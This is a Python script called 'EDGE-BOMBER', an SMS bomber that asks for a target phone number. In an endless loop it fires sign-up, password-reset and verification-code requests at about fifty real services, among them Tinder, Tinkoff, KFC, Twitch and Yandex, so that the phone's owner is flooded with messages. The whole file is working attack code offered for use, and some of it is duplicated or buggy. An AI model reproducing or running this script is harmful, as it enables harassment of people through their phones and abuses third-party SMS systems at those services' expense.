import requests, random, datetime, sys, time, argparse, os
from colorama import Fore, Back, Style
from termcolor import colored
import ctypes

ctypes.windll.kernel32.SetConsoleTitleA(b"EDGE-BOMBER  |  1.0 BETA")

os.system('cls')

succ = Fore.GREEN + '  [+]' + Fore.MAGENTA
bad = Fore.RED + '  [-]' + Fore.MAGENTA

banner = """
  ▓█████  ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   ▓█████  ██▀███  
  ▓█   ▀ ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
  ▒███   ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒
  ▒▓█  ▄ ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
  ░▒████▒░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒
  ░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
   ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
     ░    ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░    ░     ░░   ░ 
     ░  ░ ░          ░ ░         ░    ░         ░  ░   ░     
               ░                           ░                 
         Made by eXReach  |  Services: 51
         Version 1.0 BETA  |  Update - 16.02.2022
"""
 
print(colored(banner,'magenta'))
_phone = input(Fore.YELLOW + '  Enter Phone Number (79xxxxxxxxx): ' + Fore.MAGENTA)
Fore.WHITE

os.system('cls')

print(colored(banner,'magenta'))
print(Fore.GREEN + '  SMS Флуд на номер ' + Fore.WHITE + _phone + Fore.GREEN + ' Успешно запущен!')
 
if _phone[0] == '+':
    _phone = _phone[1:]
if _phone[0] == '8':
    _phone = '7'+_phone[1:]
if _phone[0] == '9':
    _phone = '7'+_phone
 
_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 
_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
 
iteration = 0
while True:
    _email = _name+f'{iteration}'+'@gmail.com'
    email = _name+f'{iteration}'+'@gmail.com'
    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print(succ, 'Grab отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
        print(succ, 'RuTaxi отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
        print(succ, 'BelkaCar отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
        print(succ, 'Tinder отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
        print(succ, 'Karusel отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
        print(succ, 'Tinkoff отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        print(succ, 'MTS отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print(succ, 'Youla отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
        print(succ, 'PizzaHut отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        print(succ, 'Rabota отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
        print(succ, 'Rutube отправлено!')
    except:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
        print(succ, 'Citilink отправлено!')
 
    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
        print(succ, 'Smsint отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
        print(succ, 'oyorooms отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
        print(succ, 'MVideo отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print(succ, 'newnext отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        print(succ, 'Sunlight отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
        print(succ, 'alpari отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        print(succ, 'Invitro отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
        print(succ, 'Sberbank отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        print(succ, 'Psbank отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        print(succ, 'Beltelcom отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
        print(succ, 'Karusel отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
        print(succ, 'KFC отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        print(succ, 'carsmile отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        print(succ, 'Citilink отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
        print(succ, 'Delitime отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        print(succ, 'findclone звонок отправлен!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
        print(succ, 'Guru отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        print(succ, 'ICQ отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
        print(succ, 'InDriver отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
        print(succ, 'Invitro отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
        print(succ, 'Pmsm отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
        print(succ, 'IVI отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
        print(succ, 'Lenta отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
        print(succ, 'Mail.ru отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
        print(succ, 'MVideo отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
        print(succ, 'OK отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://plink.tech/register/',json={"phone": _phone})
        print(succ, 'Plink отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
        print(succ, 'qlean отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
        print(succ, 'SMSgorod отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
        print(succ, 'Tinder отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
        print(succ, 'Twitch отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
        print(succ, 'CabWiFi отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
        print(succ, 'wowworks отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
        print(succ, 'Eda.Yandex отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print(succ, 'Youla отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
        print(succ, 'Alpari отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
        print(succ, 'SMS отправлено!')
    except:
        print(bad, 'не отправлено!')
 
    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
        print(succ, 'Delivery отправлено!')
    except:
        print(bad, 'Не отправлено!')
 
 
 
    try:
        iteration += 1
        print()
        print((Fore.YELLOW + '  {} круг пройден.').format(iteration))
        print()
    except:
        break